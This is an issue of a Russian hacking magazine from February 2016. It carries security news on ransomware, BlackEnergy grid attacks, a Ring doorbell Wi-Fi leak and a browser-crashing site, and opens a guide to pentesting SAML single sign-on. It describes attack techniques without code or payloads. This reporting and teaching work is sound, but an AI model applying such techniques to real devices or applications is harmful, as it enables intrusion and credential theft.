                                                          ФЕВРАЛЬ 2016


              №205
ВЗЛОМ
SINGLE
SIGN-ON
ПЕНТЕСТИМ
                                 Cover
                                     StoryВЕБ-АППЛИКУХИ
НА БАЗЕ SAML SSO




Создаем
свой Cydia-
репозиторий

Прокачиваем
Nmap скриптами
на NSE

Делаем логгер
звонков
на Android
                                         февраль 2016
          № 205





  MEGANEWS
Всё новое за последний месяц

  НЕБЕЗОПАСНАЯ АУТЕНТИФИКАЦИЯ
Ищем баги в приложениях с Single Sign-On на базе SAML

  МОЗГИ НАПРОКАТ
Как сделать нейросеть или воспользоваться чужой

  ВСЕ СВОЕ НОШУ С СОБОЙ
Обзор Remix OS — десктопной ОС на основе Android

  КРАСНЫЙ ШУМ
Скрываем сетевую активность от продвинутой слежки

 WWW2
Интересные веб-сервисы

  NETFLIX И НИКАКОГО РАССЛАБОНА
Стриминг и пираты конкурируют за право убить телевизор: кто победит и что будет дальше

  ГАДЖЕТЫ КОМАНДЫ ][
Какими смартфонами, планшетами и умными часами пользуются сотрудники журнала

  СМАРТФОН, ФАС!
Используем голосовое управление на полную катушку

  МАГАЗИН ДЛЯ IOS
Создаем Cydia-репозиторий с нуля

  РОБОТЫ В ТВОЕМ ДОМЕ
Обзор экзотических устройств на основе Android

  БЛЕСК И НИЩЕТА BLACKBERRY PRIV
Колонка Евгения Зобнина

  КАРМАННЫЙ СОФТ
Выпуск #16. Продуктивность

  EASY HACK
Хакерские секреты простых вещей

  ОБЗОР ЭКСПЛОИТОВ
Анализ свеженьких уязвимостей

  СОВРЕМЕННЫЙ ХЕШКРЕКИНГ
Взгляд на взлом хешей изнутри

  THERE IS NO 100% GUARANTEE
Колонка Юрия Гольцева

  ПРОКАЧАЙ СВОЙ NMAP
Расширяем возможности культового сканера при помощи NSE-скриптинга

  X-TOOLS
Софт для взлома и анализа безопасности

  POWER OF COMMUNITY 2015: ФИНГЕРПРИНТИНГ СМАРТФОНОВ
Колонка Дениса Макрушина

  БЕСПЛАТНЫЕ АНТИВИРУСЫ — ПРОВЕРКА БОЕМ
Насколько хороши бесплатные антивирусы и почему они бесплатны?

  ЧЕРНАЯ МАГИЯ GIT HOOK
Как не пустить джуниоров в мастер-ветку и вообще все автоматизировать

  ЛОГГЕР ЗВОНКОВ НА ANDROID
Изучаем систему обмена сообщениями на жизненных примерах

  MATERIAL DESIGN В ANDROID
Продолжаем изучать модную тему. Готовься, это будет лонгрид!

  ЗАДАЧИ НА СОБЕСЕДОВАНИЯХ, СПЕЦВЫПУСК
Стань богатым Java-программистом!

  ТУР ПО BSD
Часть 1. Рождение Berkeley Software Distribution

  САМЫЙ БЕЗОПАСНЫЙ IM
Рассматриваем клиенты Tox для Linux

  СЕТЕВОЙ КОНТРОЛЛЕР
Разбираемся с новой ролью Windows Server 2016

  ЖОНГЛИРУЕМ КОНТЕЙНЕРАМИ
Разные полезные плюшки для Docker

  FAQ
Вопросы и ответы

  ТИТРЫ
Кто делает этот журнал
                                        Мария «Mifrill» Нефедова
                                                      nefedova.maria@gameland.ru





ПРОТИВ ЛОМА
НЕТ ПРИЕМА

          нварь оказался более богат на «фейлы» разработчиков рансомвари
          и криптовирусов, чем весь предыдущий год. В начале января обно-
          вился шифровальщик Linux.Encoder, атакующий пользователей Linux
          (преимущественно системных администраторов, хостеров и подоб-
            ных). Новая версия успела поразить более 600 серверов, однако ав-Я
торы малвари снова потерпели неудачу: эксперты сумели вскрыть шифрование
Linux.Encoder, хотя в новой версии хакеры постарались учесть прошлые ошибки.
   «Видимо, они совершенно забыли о том, что нужно выбрать алгоритм
хеширования, так что данные, обработанные хеш-функцией, остаются без
изменений. В результате полный AES-ключ теперь записывается в зашиф-
рованный файл, и восстановить данные — это сущий пустяк», — пишет
специалист компании Bitdefender Богдан Ботезату. Компания традиционно
представила бесплатный инструмент для расшифровки данных, пострадав-
ших от Linux.Encoder.
   Через неделю специалисты Trend Micro обнаружили другой яркий пример
фейла: авторы вымогателя RANSOM_CRYPTEAR.B взяли за основу чужой код.
Основу кода RANSOM_CRYPTEAR.B составляет код Hidden Tear — вымогатель-
ской малвари, созданной исключительно в образовательных и научных целях. По
словам Ютку Сена, автора Hidden Tear, это — ловушка для ленивых хакеров, ко-
торые вместо написания собственного вымогателя решат позаимствовать код
чужого.
   Как оказалось, авторы вымогателя не просто взяли код-ловушку, но и уму-
дрились его испортить: шифровальщик после кодирования файлов не от-
правлял ключ шифрования на командный сервер, а попросту терял его. Узнав
о проблеме, Ютку Сен исследовал образец малвари и заверил, что встроен-
ный им в исходники бэкдор актуален, после чего подробно описал процесс
воссоздания ключа в своем блоге.

   Однако Hidden Tear не единственная малварь, которую Сен опубликовал на
GitHub. В тех же «образовательных целях» он обнародовал исходные коды еще
одного шифровальщика, EDA2, на базе которого тоже была создана настоя-
щая малварь Magic.
  В этот раз исследователю повезло меньше. В админке EDA2 тоже был пред-
усмотрен бэкдор, позволяющий получить доступ к базе данных хакеров. Вот
только Сен не подумал о бесплатных хостингах, которыми часто пользуются
хакеры: если администрация такого хостинга получает жалобы на аккаунт, вся
информация нарушителя (а вместе с ней и ключи) просто удаляется.
   Неизвестные разработчики Magic связались с Ютку Сеном и предложи-
ли ему удалить свои репозитории с GitHub, взамен на что злоумышленники
в течение 15 дней бесплатно предоставят всем пострадавшим пользователям
ключи для дешифровки файлов. Пока никто не может сказать точно, сдержат
ли неизвестные свое обещание и чем закончится эта история.

  Примерно в это же время развернулась другая история: издание Bleeping
Computer сообщило об обнаружении уязвимости в шифровальщике TeslaCrypt
(популярное семейство троянов, повсеместно используемое хакерами), ко-
торая позволила найти способ расшифровки пострадавших файлов. Автор
TeslaCrypt решил схитрить: использовать один и тот же ключ шифрования для
всех файлов жертвы, но зашифровать этот ключ при помощи более стойкого
алгоритма.
  Первыми эту «матрешку» обнаружили специалисты «Лаборатории Каспер-
ского», затем до нее добрался пользователь форума Bleeping Computer, ко-
торый написал пару скриптов на Python и опубликовал их на GitHub. Вскоре
из нее родилось приложение для Windows — TeslaDecoder, помогающее рас-
шифровать пострадавшие от TeslaCrypt файлы. Практически сразу же вышел
релиз TeslaCrypt 3.0, где эта уязвимость была устранена, однако для старых
версий она по-прежнему актуальна.

  В конце января системы трех индийских банков и фармацевтической ком-
пании поразил вымогатель LeChiffre. Как выяснили специалисты Malwarebytes,
LeChiffre написан очень непрофессионально, а заражение вообще производи-
лось вручную: неизвестный злоумышленник был вынужден внедриться в сети
пострадавших компаний, повысить свои привилегии и получить доступ к дру-
гим машинам сети через незащищенные порты Remote Desktop.
  В результате заражения банки понесли убытки в десятки миллионов дол-
ларов, однако и здесь хакеры потерпели поражение: к проблеме подключился
эксперт компании Emsisoft Фабиан Восар, который сумел создать инструмент
для дешифровки пострадавших данных. Восар также отслеживает появление
новых версий дешифровщика, общаясь с жертвами в специальной теме на
форумах Bleeping Computer.
ТЕМНАЯ ЭНЕРГИЯ
         едущие компании по информационной безопасности (ESET, iSight,
           Trend Micro и другие) в начале месяца представили первые отчеты
         об исследованиях атак на украинские энергосети.
          В конце декабря 2015 года немалая часть Западной Украины
             (а именно Ивано-Франковская область, включая столицу) осталась
 без электричества. Служба безопасности Украины немедленно инициировалаВ
 расследование произошедшего, не преминув обвинить в случившемся рос-
 сийских хакеров: ведь в ходе атак была использована малварь, известная как
  BlackEnergy. Авторство приписывают российской хакерской группе Sandworm,
 которая ранее проводила атаки на SCADA-системы в США и Европе.
   В ходе расследования специалисты ESET обнаружили специальную вер-
 сию плагина KillDisk (Win32/KillDisk), который злоумышленники начали исполь-
 зовать с 2015 года (в 2014 году BlackEnergy использовал в работе Windows-мо-
 дуль dstr, который предназначался для уничтожения и перезаписи данных
 зараженной машины). Обычная версия KillDisk предназначена для уничтоже-
 ния и перезаписи более 4000 типов файлов с целью необратимо повредить
операционную систему. Однако эта версия была специально настроена под
АСУТП украинских электростанций: она обладала программируемым време-
нем запуска, умела подчищать за собой журналы событий Windows, повре-
ждала только 35 типов файлов (документы, изображения, файлы баз данных
и конфигурации) и ряд специализированных технических процессов.
  Помимо вредоноса BlackEnergy, специалисты ESET выявили на одной из
пострадавших машин SSH-бэкдор (Win32/SSHBearDoor.A trojan), позволяю-
щий злоумышленникам получить доступ к зараженной системе. Однако экс-
перты весьма осторожны в своих выводах: они считают, что BlackEnergy, равно
как и найденный SSH бэкдор, уже сами по себе могли предоставить доступ
к зараженным сетям многим злоумышленникам. Ни одна компания не спешит
обвинять в случившемся Sandworm.
   BlackEnergy также нашли в сети аэропорта Борисполь, на одной из рабочих
станций сети. Спикер администрации президента Украины по вопросам АТО
Андрей Лысенко заявил, что хакерская атака была предотвращена, заражен-
ную машину немедленно изолировали от сети, а все данные о случившемся
были переданы экспертам CERT UA. Лысенко отметил, что за инцидентом явно
стоят российские хакеры.
  В конце января специалисты компании ESET сообщили о новой таргети-
рованной атаке на украинские энергосети: хакеры рассылали энергетическим
предприятиям Украины фишинговые письма от лица компании «Укрэнерго»
с вредоносным документом Excel во вложении. На этот раз, в отличие от пре-
дыдущих атак, злоумышленники использовали не троян BlackEnergy, а моди-
фицированную версию бэкдора Gcat.
   Gcat — малварь с открытым исходным кодом, написанная на языке Python.
Модифицированная версия была сильно урезана и позволяла только испол-
нять команды оболочки зараженной системы. По мнению вирусного аналитика
ESET Роберта Липовски, использование вредоносного ПО с открытым исход-
ным кодом нехарактерно для кибератак, ведущихся при поддержке государ-
ства. Эксперт подчеркнул, что «новые данные не проливают свет на источник
атак на энергосектор Украины, лишь предостерегают от поспешных выводов».
   29 января эксперты «Лаборатории Касперского» опубликовали собствен-
ное развернутое исследование о кибератаках на различные критические сек-
торы Украины. Группа хакеров, которая стала использовать SCADA-модули
BlackEnergy и атаковать промышленные и энергетические секторы по всему
миру, привлекла внимание ЛК еще в 2014 году. Одной из основных целей этих
хакеров всегда была Украина. Специалисты отмечают, что эта группа обла-
дает «уникальной квалификацией, намного выше среднего уровня типичных
организаторов DDoS-атак».
  В 2014 году хакеры эксплуатировали веб-уязвимости. В 2015 году начали
использовать документы Excel с макросами, а на днях привлекли и Microsoft
Word: новый вредоносный документ был загружен на сервис мультисканера
из Украины 20 января 2016 года. Основной файл малвари — FONTCACHE.DAT
— содержал минималистичную модификацию BlackEnergy v2, которая соеди-
няется с сервером управления 5.149.254.114 по 80-му порту, жестко прописан-
ному в коде. Этот же сервер ранее фигурировал в отчетах компании ESET, ко-
торая анализировала атаки против Украины.
   Судя по всему, авторы малвари продолжают совершенствовать свое детище.
К примеру, они перестали использовать неподписанный драйвер для стирания
дисков на низком уровне и заменили его средствами стирания более высокого
уровня, которые работают с расширениями файлов; этот метод прекрасно ра-
ботает на 64-разрядных системах, и ему не нужны права администратора.
   Эксперты отмечают, что основными целями BlackEnergy на сегодняшний
день являются «разрушительные действия и промышленный шпионаж», а так-
же компрометация систем промышленного управления.
   Впрочем, действия хакеров в январе не ограничились одной лишь Украиной.
Министр энергетики Израиля Юваль Штайниц заявил, что энергетические сети
Израиля тоже подверглись серьезной хакерской атаке. По данным газеты The
Jerusalem Post, начало атаки пришлось на понедельник, 25 января, и совпало
с резким ухудшением погоды в Иерусалиме, так что для устранения проблемы
пришлось на два дня остановить работу ряда израильских энергосетей.



                  «Плохие парни использовали инструменты,
                  аналогичные Shodan, задолго до его появ-
                   ления. И они продолжат их использовать,
                  потому что Shodan — не анонимный сер-
                    вис. Мы предпринимаем множество мер,
                  чтобы ограничить использование Shodan
                  во вред и удостовериться, что информацию
                  получают только хорошие парни. Имеется
                 множество свидетельств тому, что Shodan
                  помогает сделать интернет лучше».


                                                      Основатель поисковика
                                                       Shodan Джон Мазерли
                                                           об обвинениях
                                                               в адрес сервиса
ВЗЛОМАЙ
ВИДЕОДОМОФОН
И ПОЛУЧИ ПАРОЛЬ
ОТ WI-FI

           сследователи постоянно находят баги в IoT-устройствах, начи-
           ная от умных чайников и заканчивая автомобилями. Однако новый
           Wi-Fi-домофон Ring выводит небезопасность подобных девайсов
          на новый уровень. Специалисты Pen Test Partners даже не успели
          применить свои технические познания: уязвимость обнаружилась
 прямо на корпусе устройства.И
  Любой желающий может стать хакером: достаточно взять обычную отвертку,
снять Ring со стены, открутить пластиковую панель и нажать на оранжевую кноп-
ку на задней части корпуса домофона. Кнопка активирует беспроводной режим
и открывает доступ к файлу конфига с SSID и паролем. Далее злоумышленник
волен делать все, что вздумается: пропуск в Wi-Fi жертвы у него в кармане.
   Блог Pen Test Partners гласит, что исправление для прошивки домофона уже
появилось. Остается только верить, что все владельцы этих домофонов обно-
вятся вовремя.

  334    5200
  года тюрьмы получил         биткойнов прошло через
    хакер, воровавший           кошелек операторов
        кредитки                       Cryptolocker

      В Турции 26-летнему хакеру Онуру Коп-                          Как создать стартап, приносящий миллионы
   чаку вынесли необычайно суровый приговор.                     долларов? Специалист компании F-Secure Мик-
   Арестованный в 2013 году злоумышленник был                    ко Хиппонен в очередной раз доказал, что для
   оператором фишингового сайта, маскировав-                     этого достаточно стать оператором вымогатель-
   шегося под страницу банка. Сайт был частью                      ского ПО. Эксперт проанализировал финансы
   большой схемы. Копчак и одиннадцать его по-                    хакерской группы, стоящей за шифровальщиком
   дельников похищали информацию о банковских                      Cryptolocker, что было не слишком трудно: опера-
   картах жертв и данные об их аккаунтах. В 2013-                  торы вредоноса используют в работе лишь пару
  м хакера обвинили в краже личности, подделке                   кошельков Bitcoin. Оказалось, что через руки
   веб-сайтов, мошенничестве со средствами до-                   преступников прошло уже более 2,2 миллиона
   ступа (банковскими картами), а также мошенни-                   долларов, или 5200 биткойнов. «Неплохая сумма,
   честве с использованием электронных средств                      к тому же свободная от налогов, — пишет Хиппо-
   сообщения. Копчак был приговорен к 199 годам                    нен. — Все это заставило меня задуматься. Су-
   7 месяцам и 10 дням тюрьмы по иску, который                   ществуют компании-„единороги“, стоящие более
   подали 43 пострадавших. Однако в процессе                    миллиарда, но не приносящие никакой прибы-
   слушаний в суд обратились еще 11 жертв карде-                     ли. А теперь могут существовать еще и группы
   ров, так что к приговору в итоге добавили еще                     преступников, чья рыночная стоимость была бы
   135 лет тюремного заключения.                              даже выше. Все это очень странно».
НОВЫЕ ПРОЦЕССОРЫ
БУДУТ ПОДДЕРЖИВАТЬ
ТОЛЬКО WINDOWS 10
            Microsoft придумали еще один способ заставить пользователей
           установить Windows 10: Windows 7 и 8.1 не будут поддерживаться но-
         выми процессорами. Это не означает, впрочем, что Microsoft вооб-
        ще прекратит поддержку Windows 7 и 8.1.
           Официальный блог компании сообщает, что ограничение всту-
 пит в силу с выходом архитектуры Kaby Lake компании Intel, чипа 8996 ком-В
 пании Qualcomm и Bristol Ridge компании AMD. Новейшее шестое поколение
 процессоров Intel — Skylake — тоже частично подпадает под эту «реформу»:
  хотя некоторые устройства на базе Skylake уже были выпущены с поддержкой
 Windows 7 и 8.1, они будут поддерживать старые ОС лишь до 17 июля 2017 года.
«ЛАБОРАТОРИЯ
КАСПЕРСКОГО»
ВЫПУСТИЛА
БЕСПЛАТНЫЙ
АНТИВИРУС
         нтивирус Kaspersky Free объединил в себе все самое необходимое:
        файловый и веб-антивирусы, антифишинг, автоматические обнов-
         ления и так далее. Бесплатный продукт распознает и автоматически
         блокирует подозрительные файлы, предотвращает загрузку вредо-
         носных программ и предупреждает пользователя о потенциально
опасных сайтах. Антивирусные базы обновляются автоматически в режимеА
реального времени.
  «Мы несколько лет думали, исследовали, считали, прикидывали и горячо
спорили, разрабатывать бесплатный антивирус или нет. И выяснили, что пе-
ресечение аудиторий минимально: пользователям платных продуктов нужны
функции, которые остались за бортом Free, они могут позволить себе запла-
тить немногим больше полутора тысяч рублей за премиум-продукт для полно-
масштабной защиты своих данных», — заявляют в компании. Под функциями
платных продуктов, которых нет в Kaspersky Free, подразумевается родитель-
ский контроль, защита онлайн-платежей, защита мобильных устройств, техни-
ческая поддержка и так далее.


123456 — САМЫЙ ПОПУЛЯРНЫЙ ПАРОЛЬ В МИРЕ

   Время идет, но некоторые вещи не меняются. К примеру, плохих паролей не становится
меньше, пользователи по-прежнему очень любят сочетания password и 123456. Компания
SplashData опубликовала уже пятый ежегодный отчет, в котором перечислила худшие
пароли 2015 года, основываясь на информации, просочившейся в Сеть в результате
различных утечек данных

                       место        123456: Самый популярный пароль
      топ-10             по сравнению      в мире, он неизменно возглавляет спи-
     пароролей          с 2014 г.          сок с 2011 года.

                       1234567890   123456                                      и qwertyuiop:  1
                                    Некоторые длинные пароли настоль-  2 password                                       ко просты, что лишняя пара символов
  3  12345678     1                здесь вообще не имеет смысла.
  4 qwerty         1          Baseball                                                 и football: Спорт
  5  12345           2               по-прежнему популярен, в список худ-
   123456789                ших паролей уже не первый год входят  6
                                      названия разных видов спорта.  7 football    3 
                      Solo   1234                                и Starwars: Единственные  8                         1 
                                   заметные новички списка 2015 года —  9  1234567       2                                       пароли, созданные на волне выхода
10  baseball    2               седьмого эпизода «Звездных войн».
РОСКОМНАДЗОР
РАЗРЕШАЕТ

          есмотря на все попытки «Роскомсвободы» опротестовать судебное
         решение о блокировке Rutracker.org, суд не принял жалобы поль-
           зователей. Решение все-таки вступило в силу 22 января текущего
            года, а в понедельник, 25 января, началась вечная блокировка. Тре-
           кер уже заблокирован большинством крупных провайдеров РФ.
    Администрация ресурса в очередной раз подчеркнула, что не намеренаН
 добиваться отмены блокировки или предпринимать какие-либо шаги для ее
 обхода. «Это приведет к размытию аудитории», — сообщили представители
  RuTracker. Не идет речи и о возобновлении переговоров с представителями
 Роскомнадзора или компаний-правообладателей: «Требования правооблада-
 телей и так выходят за разумные рамки, от нас требуют самим отслеживать все
 ссылки на пользовательский контент, размещаемые на форуме. Это невозмож-
 но технически и вообще противоречит мировой практике».
   Руководство ресурса также напомнило, что пользователи сами определи-
ли судьбу трекера голосованием: большинство согласилось искать способы
обхода блокировок и пожелало, чтобы ресурс не «прогибался» под правоо-
бладателей, удаляя раздачи и контролируя контент. Когда блокировка всту-
пила в силу, правообладателей действительно лишили возможности удалять
раздачи с трекера. «Все CHA-аккаунты без исключений переведены в статус
обычного пользователя. Удаление по обычной схеме через abuse-отдел пока
на „профилактике“. В течение недели будет ясна дальнейшая политика треке-
ра в отношении правообладателей», — сообщил вице-президент ассоциации
«Русский щит» Олег Яшин.
   «Русская служба новостей» процитировала слова советника президента
РФ по интернету Германа Клименко, высказавшегося по данному вопросу до-
вольно резко: «Если уж бороться за соблюдение авторских прав, нужно дей-
ствовать каким-то другим способом. Каким, я не знаю, но сейчас это выглядит
как не очень хорошая комедия, — говорит Клименко. — Если бы законодате-
ли предварительно проконсультировались с индустрией, им бы объяснили, что
блокировка домена для таких ресурсов абсолютно не имеет никакого значения.
Регистрация домена в Америке стоит 7–8 долларов, если доменная зона .com.
Мне кажется, цель не будет достигнута».
   Так как сменить домен пиратам действительно несложно, Клименко полага-
ет, что с подобными интернет-ресурсами нужно договариваться и совместно
искать более эффективные способы решения проблемы, а не судиться и бло-
кировать. «На текущий момент эффективность решения — ноль», — заключил
Клименко.
  Еще более воодушевляющими для пользователей прозвучали слова
пресс-секретаря Роскомнадзора Вадима Ампелонского в эфире телеканала
«РБК». На вопрос ведущего о том, собирается ли ведомство как-то бороться
с различными вариантами обходов блокировок, Ампелонский заявил: «Спосо-
бы обхода блокировок существуют. Пользоваться ими не противозаконно. В то
же время мы относимся спокойно к тому, что пользователи используют VPN,
прокси-серверы, анонимайзеры и так далее».
САЙТ, КОТОРЫЙ
ВЫЗЫВАЕТ КРАШ
СМАРТФОНА
          ереход по ссылке crashsafari.com (лучше НЕ переходить) гаранти-
          рованно отправит в нокаут устройство, работающее на iOS. Вопре-
           ки названию сайта, подшутить таким образом можно не только над
          пользователями Safari: почти наверняка такая же реакция проявится
          и у аппарата с Android. Мобильные устройства впадают в кому бла-
 годаря всего четырем строкам кода.П
  На сайте работает простой скрипт, добавляющий тысячи символов в секун-
ду в строку поиска браузера, что быстро приводит к перегрузке памяти, пере-
греву аппарата и принудительной перезагрузке. Сайт также влияет на обыч-
ные компьютеры и ноутбуки, особенно не слишком мощные, но в этом случае
к перезагрузке устройства посещение сайта не ведет: стационарные компью-
теры лучше справляются с проблемой перегрева.

  15    654     заблокированы            уязвимости обнаружено
      пожизненно                 в продуктах Apple
    на территории РФ                 в 2015 году
      На конец января 2016 года пожизненная                    Как ни странно, по итогам 2015 года ре-
   блокировка на территории России применя-                 корд по количеству багов поставили совсем
   ется уже к пятнадцати пиратским ресурсам.                 не компания Adobe и ее дырявый Flash Player.
   Роскомназдор сообщает, что 27 января была              По данным CVE Details, первое место по числу
   завершена проверка 1215 операторов связи                найденных уязвимостей заняла компания Apple,
   по всей стране, показавшая, что 94% опера-                 в продуктах которой за год было выявлено 654
   торов осуществляют постоянную блокировку                проблемы. Уязвимости почти поровну раздели-
   нарушителей авторских прав в полном объ-                  лись между операционными системами компа-
   еме. В список сайтов, получивших пожиз-                     нии: 384 бага в OS X и 375 багов в iOS. На вто-
   ненный бан, входят: rutracker.org, bobfilm.net,              ром месте топа находится компания Microsoft
    film.net, kinokubik.com, kinozal.tv, kinobolt.ru,                  с 571 уязвимостью, отстающая от своего глав-
    rutor.org, seedoff.net, torrentor.net, tushkan.                   ного конкурента на 83 бага. Также в десятку
    net, serial-online.net, wood-film.ru, kinovo.tv,                   попали: Cisco — 488 багов, Oracle — 479 багов,
   bigcinema.tv.                                          Adobe — 460 багов, Google — 323 бага, IBM —
                                                           312 багов, Mozilla — 188 багов, Canonical —
                                                         153 бага и Novell — 143 бага.
ДЕТСКИЙ ПРОЕКТ
ПРЕВРАТИЛ САЙТ
MIT В ПИРАТСКИЙ
РЕСУРС

           дин из доменов Массачусетского технологического института
           внезапно превратился в эталонный пиратский сайт: за последний
           месяц правообладатели направили на него более 40 000 жалоб
            за нелегальный контент. Виной всему, как ни странно, проект для
             детей, посвященный языку программирования Scratch.
   По адресу scratch.mit.edu располагается креативная игровая площадка:О
 используя простой веб-интерфейс, можно создавать небольшие программы,
 игры, мультфильмы и тому подобные вещи. За последний год ресурс набрал
 немалую популярность — пользователи разместили на сайте более 12 милли-
онов проектов. Но юные программисты очень часто используют в своих рабо-
тах популярные треки самых разных исполнителей, при этом даже не понимая,
что нарушают закон.
   Scratch не имеет никакой «специальной лицензии» на всю музыку мира,
и тот факт, что проект образовательный, вряд ли поможет в суде, если до этого
дойдет. Впрочем, в MIT понимали, что в будущем могут столкнуться с подоб-
ными проблемами: правообладатели имеют право изъять свой контент с сай-
та, хотя авторы Scratch очень просят их подумать перед этим дважды.




                 «Шифрование — это основа нашего бу-
                    дущего. Бесполезно спорить о том, что
                  „шифрование — это плохо и нужно его
                      как-то убрать“. Вместо этого стоит спро-
                     сить себя, как нам лучше приспособить-
                    ся к работе с этой основой. Да, мы, как
                     никогда, обеспокоены вопросами при-
                      ватности. Но чтобы все было сделано
                    правильно, пора осознать, что невоз-
                 можно выбрать одно из двух: только без-
                    опасность или только приватность».

                                                            Адмирал Майкл Роджерс, директор
                                         Агентства национальной безопасности США
ФИШИНГ ОБХОДИТСЯ ПРЕДПРИЯТИЯМ
ОЧЕНЬ ДОРОГО

   Аналитики компаний Cloudmark и Vanson Bourne изучили данные, полученные от 300
различных компаний, 200 из которых работают в США и еще 100 в Великобритании. Иссле-
дователи попытались выяснить, в какие суммы обходятся предприятиям узконаправленные
фишинговые кампании и какие цели преследуют хакеры, атакуя крупные фирмы

 1 600 000
 1 470 000

В среднем компании тратят более полутора миллионов
долларов на каждый инцидент в области кибербезопасности.


84% ли,компаний-реципиентовчто хотя бы один разпризна-они не    32% компанийфинансовыепонеслипотери
       сумели отразить кибератаку                   из-за действий хакеров.
       и пострадали от таргетирован-
       ного фишинга.
90% направленныхна предприятияфишинговыхосуществляетсяатак    25% предприятийют, что хакерыутвержда-охотились
       посредством email. 48% посред-              за их интеллектуальной
       ством смартфонов. 40% через                собственностью и атаки
       аккаунты сотрудников в соци-                привели к краже
       альных сетях.                            ценных данных.
44% алистоватак приходитсякомпаний.на 43%IT-специ-атак     56% компаний,от фишинга,пострадавшихпосле атак
       направлены на сотрудников                  организуют для персона-
      финансовых отделов. 27% атак               ла тренинги по информа-
      бьют напрямую по руководите-               ционной безопасности.
      лям предприятий.
В ДЕЛЕ
THE FAPPENING
ПОЯВИЛСЯ ВТОРОЙ
ПОДОЗРЕВАЕМЫЙ

           сенью 2014 года произошел крупный скандал, известный как The
            Fappening или Celebgate: в сеть попали интимные снимки звезд
           первой величины, таких как Дженнифер Лоуренс, Ким Кардашьян
           или Кирстен Данст. Хакера, укравшего личные фото знаменито-
             стей, вроде бы удалось поймать. Но в сеть попали новые судеб-
 ные документы, согласно которым есть и второй подозреваемый — жительО
 Чикаго Эд Мажерчик.
  Мажерчик (если это был действительно он) использовал для взлома чужих
iCloud-аккаунтов обычную социальную инженерию, выдавая себя за сотруд-
ника технической поддержки Apple. Для атак на знаменитостей также исполь-
зовались фейковые домены, якобы принадлежащие Apple, и фальшивые уве-
домления об опасности. Однако в Сети высказываются предположения, что
оба подозреваемых — просто козлы отпущения.
COVERSTORY
НЕБЕЗОПАСНАЯ
АУТЕНТИФИКАЦИЯ

ИЩЕМ БАГИ
В ПРИЛОЖЕНИЯХ
С SINGLE SIGN-ON
НА БАЗЕ SAML





  Михаил Егоров,
 ИБ-исследователь
 0ang3el@gmail.com
Перед тобой практическое руководство по аудиту
безопасности веб-приложений с поддержкой SAML SSO.
Single Sign-On — это технология, которая позволяет
логиниться в веб-приложение через сторонний сайт
(провайдер). А SAML — это популярный XML-протокол для
реализации SSO. Мы подробно расскажем, что такое SAML
SSO, как он работает. Опишем, каким образом настроить
свое приложение на работу с SAML IdP. И наконец,
расскажем самое важное — какие инструменты нужно
использовать для пентестов, на наличие каких уязвимостей
нужно проверять приложение. XXE, атаки через
преобразования, XPath-инъекции, ошибки при проверке
подписи, атаки XSW, атаки на зашифрованные assertions
и многое другое. Велком!

ЧТО ТАКОЕ SAML SSO И ЗАЧЕМ ОН НУЖЕН?
Single Sign-On (SSO) — это технология, которая позволяет залогиниться
в веб-приложении через сторонний сайт-провайдер. К плюсам использования
SSO можно отнести следующее:
•  Приложение может не хранить аутентификационную информацию — все
   хранится на стороне провайдера. Если приложение взломают, атакующий
   не получит аутентификационную информацию (в зависимости от приложе-
   ния — это могут быть пароли, хеши паролей, зашифрованные пароли).
•  У пользователя одна и та же учетная запись для доступа к нескольким при-
   ложениям, если они используют один и тот же SSO-провайдер. Теорети-
   чески это должно заставить пользователя выбрать более стойкий единый
   пароль.
•  Если пользователь был аутентифицирован при доступе к одному из прило-
   жений, то при доступе к другому приложению повторный ввод имени поль-
   зователя и пароля не потребуется.

К минусам можно отнести следующее:
•  Атакующему нужно узнать только один пароль, чтобы получить доступ сра-
   зу к нескольким приложениям от имени пользователя.
•  Необходимо доверять SSO-провайдеру, который представляет собой
   «черный ящик». Как правило, владелец приложения ничего не знает о без-
   опасности SSO-провайдера: каким образом хранится аутентификацион-
   ная информация, кто имеет к ней доступ, какие действия предпринимает
   SSO-провайдер для обеспечения безопасности.
•  SSO-провайдер — это точка отказа. Если по каким-то причинам он недо-
   ступен, это приведет к неработоспособности приложения.
•  Код на стороне приложения, отвечающий за SSO, — это дополнительный
   источник уязвимостей.

Security Assertion Markup Language (SAML) — это открытый стандарт, который
описывает фреймворк, позволяющий обеим сторонам (приложению и провай-
деру) обмениваться аутентификационной и авторизационной информацией.
Аутентификационная и авторизационная информация представляется в виде
набора утверждений (assertions), которые подписаны провайдером (и в неко-
торых случаях зашифрованы).
  На момент написания статьи последняя версия стандарта — SAML 2.0.
  По стандарту SAML клиент (веб-приложение) и провайдер аутентификации
обмениваются аутентификационными утверждениями (assertions) через XML.
А это означает, что SAML основан на следующих стандартах w3c, относящихся
к XML:
•  Extensive Markup Language — стандарт, касающийся языка XML;
• XML Schema — стандарт, касающийся XML-схем;
• XML Signature — cтандарт, относящийся к обработке цифровых подписей
   в XML;
• XML Encryption — cтандарт, относящийся к шифрованию данных в XML.
   У SAML есть множество сценариев применения:
• Web SSO;
•  Attribute based authorization;
•  Identity Federation;
•  WS-Security.

Web SSO (или SAML SSO в нашей терминологии) — это наиболее распростра-
ненный юзкейс для SAML, поэтому самый интересный с точки зрения безопас-
ности. В нем мы и будем сегодня разбираться.
  В аутентификации через SAML SSO участвуют три стороны:
•  провайдер аутентификации (SAML identity Provider или SAML IdP);
•  веб-приложение (SAML Service Provider или SAML SP);
•  браузер пользователя (User Agent).

User Agent аутентифицируется на стороне SAML IdP, а затем получает доступ
к веб-приложению. Веб-приложение доверяет провайдеру и получает от него
аутентификационную информацию. Стороны SAML SSO и их взаимоотноше-
ния представлены на рис. 1.
                                                                  Рис. 1. Стороны
                                                   SAML SSO и их взаи-
                                                         моотношения





В качестве IdP провайдера может выступать один из онлайн-сервисов, таких
как OneLogin, Ping Identity, Okta и другие. Или ты можешь развернуть свой IdP,
используя софт — Shibboleth или OpenAM. Рассмотрим по шагам, каким обра-
зом приложение аутентифицируется на стороне провайдера и затем получает
доступ к приложению.
   Существует два альтернативных flow для SAML SSO: SP-initiated flow и IdP-
initiated flow. Различие заключается в том, к кому обращается User Agent в на-
чале процесса — к приложению или к провайдеру. Мы рассмотрим SP-initiated
flow, который представлен на рис. 2.
  На первом шаге User Agent обращается к приложению. Так как пользователь
не был аутентифицирован, приложение перенаправляет браузер на страницу
аутентификации провайдера — IdP Login URL. Этот URL приложение берет из
конфигурации SAML. В момент редиректа приложение добавляет параметр
SAMLRequest в строку запроса (query string).
   Браузер делает запрос к IdP Login URL c параметром SAMLRequest. IdP ау-
тентифицирует пользователя и делает редирект браузера обратно в приложе-
ние (на Assertion Consumer URL или ACS URL) с параметром SAML Response
в строке запроса, который содержит закодированное сообщение Response.
